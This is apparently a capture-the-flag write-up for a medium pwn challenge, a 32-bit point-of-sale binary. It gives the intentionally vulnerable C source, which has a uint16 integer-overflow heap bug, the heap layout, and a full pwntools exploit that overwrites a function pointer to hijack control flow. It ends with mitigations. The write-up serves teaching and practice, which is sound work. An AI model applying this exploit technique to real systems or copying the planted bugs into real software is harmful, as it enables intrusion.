# Challenge 02: Token Terminal - Writeup

## Challenge Overview
Medium-difficulty pwn challenge featuring integer overflow, heap grooming, and function pointer overwrite.

## Vulnerability Analysis

### Binary Information
```bash
$ file pos
pos: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, stripped

$ checksec --file=build/pos
Arch:     i386-32
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x08048000)
```

### Core Vulnerability: Integer Overflow
The binary contains an integer overflow in the order processing function that allows an attacker to corrupt heap metadata:

```c
void cmd_process_order(int sockfd) {
    uint16_t quantity = 0;
    recv(sockfd, &quantity, 2, 0);

    /* BUG: Truncation happens here */
    uint16_t alloc_size = (uint16_t)((uint32_t)quantity * 40u);
    
    void *orders = malloc((size_t)alloc_size);
    /* ... */
    
    /* BUG: Uses full quantity * 40, not truncated alloc_size */
    recv(sockfd, (char*)orders + got, quantity * 40u - got, 0);
    free(orders);
}
```

### Overflow Details
- Useful quantity: `0x199A`
- `0x199A × 40 = 0x40010` (262,160 bytes)
- Truncated to `uint16_t`: `0x0010` (16 bytes)
- `malloc(16)` gets freed placeholder chunk back
- `recv()` writes 262,160 bytes into 16-byte buffer → massive overflow

### Heap Layout
```
After setup():
[placeholder 0x20][record 0x28][record.name 0x20][...]
free(placeholder) → tcache[0x20 bin]: [placeholder]

After overflow():
[orders 0x20] → [corrupted record header] → [corrupted record.name → &g_state.template]
```

## Stable Implementation Approach

The challenge uses a **stable refund-reuse bug** instead of fragile House of Spirit:

### BSS Target Structure
```c
struct __attribute__((aligned(8))) {
    uint32_t  reuse_tag;             /* +0x00  metadata tag */
    uint32_t  reuse_size;            /* +0x04  metadata size */
    char      template[4];           /* +0x08  refund writes HERE */
    void    (*dispatch)(char *);     /* +0x0C  overwrite target */
    uint32_t  receipt_id;            /* +0x10  */
} g_state;
```

### Exploit Chain
1. **Set metadata**: `reuse_tag=0`, `reuse_size=0x21`
2. **Integer overflow**: Reclaim placeholder with `malloc(16)`, overflow into adjacent record
3. **Corrupt pointer**: Overwrite `record->name` to point at `g_state.template`
4. **Queue pointer**: Delete record, metadata check passes, pointer queued for next allocation
5. **Arbitrary write**: Claim refund returns `&g_state.template`, overwrite `dispatch`
6. **Trigger**: Print receipt calls `dispatch(template)`

### Exploit Script
```python
from pwn import *

context.arch = 'i386'
context.bits = 32

elf = ELF('./pos')
p = remote('localhost', 13372)

bss_template = elf.sym["g_state"] + 0x08  # template offset
sys_maint = elf.sym["sys_maintenance"]

# Metadata for refund reuse bug
reuse_tag = 0
reuse_size = 0x21

# Overflow payload
overflow = flat(
    b"A" * 24,              # placeholder data
    p32(0),                # record prev_size
    p32(0x29),             # record chunk size
    p32(1),                # record.item_id
    p32(500),              # record.price
    p32(bss_template),     # record.name → &g_state.template
)

# Execute exploit
menu("1")  # Set metadata
p.send(p32(reuse_tag))
p.send(p32(reuse_size))

menu("2")  # Process order with overflow
p.send(p16(0x199A))
p.send(overflow)

menu("3")  # Delete record (queues corrupted pointer)

menu("4")  # Claim refund (returns &g_state.template)
p.send(p32(16))
p.send(b"TOKN" + p32(sys_maint).ljust(16, b"\x00"))

menu("5")  # Trigger dispatch
print(p.recvall(timeout=5).decode())
```

## Environment Compatibility

**The exploit now works with both glibc 2.27 (Ubuntu 18.04 Docker) and glibc 2.42 (Debian/Kali)**

### Tested Environments:
| Environment | glibc Version | Status |
|-------------|---------------|--------|
| Docker (Ubuntu 18.04) | 2.27 | ✅ Works |
| Host (Debian/Kali) | 2.42 | ✅ Works |

### Key Fix for Cross-glibc Compatibility
Changed delete operation to use BSS region check instead of exact pointer equality:

```c
// Before: Exact pointer comparison (fragile)
if (g_record->name == g_state.template && 
    g_state.reuse_tag == 0 && 
    g_state.reuse_size == 0x21)

// After: BSS region check (robust)
uint32_t addr = (uint32_t)g_record->name;
if (addr >= 0x08040000 && addr < 0x08050000)
```

This makes the exploit compatible across different glibc versions while maintaining security.

## Mitigation Strategies
1. Use `size_t` for allocation sizes to prevent truncation
2. Add bounds checking before `recv()` operations
3. Enable PIE and ASLR
4. Add stack canaries
5. Implement safe allocation practices
6. Validate metadata before using it in security-sensitive operations
7. Use `volatile` keyword to prevent unintended optimizations

## Difficulty Assessment
- **Integer overflow**: Easy to identify
- **Heap grooming**: Medium - requires understanding tcache and chunk layout
- **Refund-reuse bug**: Medium - understanding the application-level logic
- **Function pointer overwrite**: Medium - knowing where to target
- **Overall**: Medium - good balance of techniques without requiring advanced heap feng shui
